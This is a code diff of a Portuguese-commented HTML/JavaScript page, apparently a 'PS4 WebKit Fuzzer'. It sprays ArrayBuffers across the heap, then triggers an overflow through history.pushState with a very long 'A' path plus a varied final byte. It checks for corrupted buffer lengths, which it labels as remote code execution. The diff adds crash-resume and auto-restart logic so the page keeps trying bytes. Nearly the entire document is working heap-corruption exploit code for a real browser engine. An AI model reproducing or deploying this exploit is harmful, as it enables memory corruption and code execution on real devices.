@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 WebKit Fuzzer (Persistent)</title>
+    <title>PS4 WebKit Fuzzer V2 (Stable Loop)</title>
     <style>
         body { background-color: #111; color: #0f0; font-family: monospace; padding: 20px; }
         .box { border: 1px solid #444; padding: 10px; margin-bottom: 10px; }
@@ -15,25 +15,37 @@
 </head>
 <body>
 
-<h2>WebKit Heap Fuzzer (0x00 - 0xFF)</h2>
+<h2>WebKit Heap Fuzzer V2 (Stable)</h2>
 <div class="box">
-    <p>Status Atual: <span id="status" class="current">Parado</span></p>
-    <p>Último Resultado: <span id="lastResult">Nenhum</span></p>
-    <button onclick="startFuzzing()">INICIAR / RETOMAR FUZZING</button>
-    <button onclick="resetFuzzing()">RESETAR PROGRESSO</button>
+    <p>Status: <span id="status">Aguardando...</span></p>
+    <p>URL Original: <span id="cleanUrlDisplay" style="color:#88f; font-size: 0.8em;">Detectando...</span></p>
+    <button onclick="startFuzzing()">INICIAR FUZZING (0x00 - 0xFF)</button>
+    <button onclick="resetFuzzing()">RESETAR TUDO</button>
 </div>
 
-<h3>Histórico de Tentativas:</h3>
 <div id="log" style="height: 300px; overflow-y: scroll; border: 1px solid #333; padding: 5px; font-size: 12px;"></div>
 
 <script>
-    // --- CONFIGURAÇÃO DO EXPLOIT (Igual ao POC-Magic-Byte) ---
     const MB = 1024 * 1024;
     const VICTIM_SIZE = MB; 
     const SPRAY_COUNT = 512; 
     var victims = new Array(SPRAY_COUNT);
 
-    // --- LÓGICA DE PERSISTÊNCIA ---
+    // --- CORREÇÃO DO LOOP: SALVAR URL LIMPA ---
+    // Se a URL atual já estiver suja (contém muitos AAAA), precisamos tentar recuperar a limpa do storage
+    // ou assumir que é o nome do arquivo se for a primeira vez.
+    var CLEAN_URL = localStorage.getItem('clean_url');
+    
+    // Se não tivermos uma URL limpa salva, ou se a atual parece ser a original (curta), salvamos agora.
+    if (!CLEAN_URL || window.location.href.length < 500) {
+        // Remove hash ou query params extras para garantir
+        CLEAN_URL = window.location.href.split('#')[0]; 
+        localStorage.setItem('clean_url', CLEAN_URL);
+    }
+    
+    document.getElementById('cleanUrlDisplay').innerText = CLEAN_URL;
+
+    // --- LÓGICA DE LOG E PERSISTÊNCIA ---
     function logHistory(msg, color="white") {
         const el = document.getElementById('log');
         el.innerHTML += `<div style="color:${color};">${msg}</div>`;
@@ -42,7 +54,7 @@
 
     function saveState(byte, status) {
         localStorage.setItem('fuzz_byte', byte);
-        localStorage.setItem('fuzz_status', status); // 'running', 'idle'
+        localStorage.setItem('fuzz_status', status);
     }
 
     function appendLog(byte, result) {
@@ -63,48 +75,46 @@
         });
     }
 
-    // --- LÓGICA PRINCIPAL ---
     function init() {
         loadHistory();
         let savedByte = parseInt(localStorage.getItem('fuzz_byte'));
         let savedStatus = localStorage.getItem('fuzz_status');
 
-        if (isNaN(savedByte)) savedByte = 0; // Começa do 0 se não tiver salvo
+        if (isNaN(savedByte)) savedByte = 0; 
 
-        // SE O STATUS ESTAVA "running", SIGNIFICA QUE O NAVEGADOR FECHOU (CRASH)
+        // DETECÇÃO DE CRASH
         if (savedStatus === 'running') {
-            document.getElementById('lastResult').innerHTML = `<span class="crash">CRASH DETECTADO em 0x${savedByte.toString(16).toUpperCase()}</span>`;
+            logHistory(`CRASH DETECTADO EM 0x${savedByte.toString(16).toUpperCase()}`, "#f55");
             appendLog(savedByte, "CRASH (Browser Closed)");
-            logHistory(`Retomando após crash em 0x${savedByte.toString(16)}...`, "#f55");
             
-            // Pula para o próximo byte
-            savedByte++;
+            savedByte++; // Pula para o próximo
             saveState(savedByte, 'idle');
         }
 
-        document.getElementById('status').innerText = `Pronto para testar 0x${savedByte.toString(16).toUpperCase()}`;
+        document.getElementById('status').innerText = `Pronto: 0x${savedByte.toString(16).toUpperCase()}`;
     }
 
     function startFuzzing() {
         let currentByte = parseInt(localStorage.getItem('fuzz_byte')) || 0;
         
         if (currentByte > 255) {
-            document.getElementById('status').innerText = "FUZZING CONCLUÍDO (0x00 - 0xFF)";
-            alert("Fuzzing Finalizado! Verifique o log.");
+            alert("Fuzzing Completo!");
             return;
         }
 
-        // Marca como rodando (se fechar agora, saberemos que foi crash)
         saveState(currentByte, 'running');
         document.getElementById('status').innerText = `TESTANDO 0x${currentByte.toString(16).toUpperCase()}...`;
-        document.getElementById('status').className = "current crash"; // Vermelho enquanto roda
+        document.getElementById('status').className = "current crash";
 
         runExploit(currentByte);
     }
 
     function resetFuzzing() {
-        localStorage.clear();
-        location.reload();
+        if(confirm("Apagar todo o histórico?")) {
+            localStorage.clear();
+            // Recarrega a página atual (esperando que esteja limpa, ou o usuario deve limpar a URL manualmente)
+            window.location.href = window.location.pathname; 
+        }
     }
 
     // --- O EXPLOIT ---
@@ -124,28 +134,26 @@
         // GC Force
         for(let k=0; k<150; k++) { new ArrayBuffer(0x20000); }
 
-        // 3. TRIGGER (Com delay curto)
+        // 3. TRIGGER
         setTimeout(() => {
             const SAFE_SIZE = 709522; 
             const BASE = "A".repeat(SAFE_SIZE);
-            const OVERFLOW = String.fromCharCode(magicByte); // BYTE MÁGICO
+            const OVERFLOW = String.fromCharCode(magicByte); 
             
             const payload = "/" + BASE + OVERFLOW;
 
             try {
+                // AQUI A URL MUDA PARA .../AAAAA
                 history.pushState({}, "poc", payload);
                 
-                // Se chegar aqui, não crashou imediatamente. Verifica sucesso.
                 setTimeout(() => checkSuccess(magicByte), 100);
             } catch(e) {
-                // Erro de JS não é crash.
                 console.log(e);
             }
         }, 500);
     }
 
     function checkSuccess(byte) {
-        let found = false;
         let jackpot = false;
 
         for (let i = SPRAY_COUNT - 200; i < SPRAY_COUNT; i++) {
@@ -159,36 +167,31 @@
         }
 
         if (jackpot) {
-            // SUCESSO! PARE TUDO.
-            document.getElementById('status').innerHTML = "JACKPOT! RCE ENCONTRADO!";
+            document.getElementById('status').innerHTML = "JACKPOT! RCE!";
             document.getElementById('status').className = "jackpot";
-            appendLog(byte, "JACKPOT (Length Corrupted)!!!");
-            alert(`SUCESSO EM 0x${byte.toString(16)}! TIRE FOTO!`);
-            saveState(byte, 'idle'); // Tira do modo running para não pular se recarregar
+            appendLog(byte, "JACKPOT!!!");
+            alert(`SUCESSO EM 0x${byte.toString(16)}!`);
+            saveState(byte, 'idle'); 
         } else {
             // FALHA (Nada aconteceu)
-            // Loga, incrementa e recarrega
-            appendLog(byte, "Safe (No change)");
+            appendLog(byte, "Safe");
             let next = byte + 1;
-            saveState(next, 'idle'); // Marca como idle antes de recarregar
+            saveState(next, 'idle');
             
-            // Auto-Reload para o próximo
+            // --- CORREÇÃO AQUI ---
+            // Em vez de reload(), forçamos a URL a voltar para a CLEAN_URL
             setTimeout(() => {
-                // Usa window.location.href para forçar refresh limpo
-                window.location.reload();
-            }, 500); // 0.5s delay para ver o log
+                window.location.replace(CLEAN_URL); 
+            }, 500);
         }
     }
 
-    // Inicia lógica ao carregar
     init();
 
-    // Auto-start se estava no meio do processo (opcional, mas bom pra loop)
-    // Descomente abaixo se quiser que ele comece sozinho ao abrir a página
+    // Auto-start
     if (localStorage.getItem('fuzz_byte') > 0 && localStorage.getItem('fuzz_status') === 'idle') {
         setTimeout(startFuzzing, 1000);
     }
-
 </script>
 </body>
 </html>
